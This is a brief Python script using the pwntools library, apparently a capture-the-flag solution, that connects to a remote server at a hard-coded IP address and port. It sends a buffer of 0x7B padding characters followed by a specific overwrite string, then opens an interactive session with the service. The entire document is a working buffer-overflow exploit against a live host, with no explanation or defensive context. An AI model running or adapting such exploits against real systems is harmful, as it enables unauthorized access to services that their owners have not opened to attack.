from pwn import* 

r=remote('47.103.214.163',20000)

payload='A'*0x7B+'0O0o\0O0'

r.sendline(payload)

r.interactive()
